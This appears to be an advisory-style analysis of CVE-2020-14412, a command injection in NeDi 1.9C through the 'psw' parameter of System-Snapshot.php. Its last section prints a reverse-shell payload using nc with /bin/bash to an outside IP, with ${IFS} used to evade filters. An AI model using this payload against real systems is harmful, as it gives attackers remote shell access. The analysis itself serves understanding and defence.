Based on the provided information, here's an analysis of CVE-2020-14412:

**Root Cause of Vulnerability:**

- The vulnerability stems from improper handling of shell metacharacters in the `System-Snapshot.php` file of NeDi 1.9C. Specifically, the application fails to properly escape characters from a POST request.

**Weaknesses/Vulnerabilities Present:**

- **Remote Command Execution (RCE):** The primary vulnerability is the ability to execute arbitrary commands on the server.
- **Lack of Input Sanitization:** The application does not sanitize user-supplied input, allowing for shell metacharacters to be injected.
- **Insufficient Output Encoding:** The application does not encode shell metacharacters which can be interpreted as commands.
- **Potential CSRF:** The vulnerability can be exploited via Cross-Site Request Forgery (CSRF).

**Impact of Exploitation:**

- **Arbitrary Command Execution:** An attacker can execute arbitrary system commands on the server running NeDi 1.9C.
- **Full System Compromise:** Depending on the privileges of the web server process, this can potentially lead to complete compromise of the system.
- **Data Breach:** The attacker could gain access to sensitive data or modify it.
- **Denial of Service:** The attacker could disrupt services on the affected system.

**Attack Vectors:**

- **HTTP POST Request:** The vulnerability is triggered by sending a crafted POST request to `System-Snapshot.php`.
- **`psw` Parameter:** The shell metacharacters are injected through the `psw` parameter of the POST request.

**Required Attacker Capabilities/Position:**

- **Authentication:** The attacker needs to be authenticated to access the vulnerable page.
- **Network Access:** The attacker needs network access to the NeDi server, or have the user perform a CSRF attack.
- **Knowledge of Vulnerability:**  The attacker requires knowledge of the vulnerable page, parameter, and how to construct the payload.
- **Shell Metacharacter Knowledge:** The attacker needs knowledge of shell metacharacters and the correct syntax to construct a command execution payload.

**Technical Details:**
- The exploit uses `${IFS}` to bypass regex filters.
- The exploit uses a command such as: `;nc${IFS}192.168.56.1${IFS}433${IFS}-e${IFS}/bin/bash;` to obtain a reverse shell.
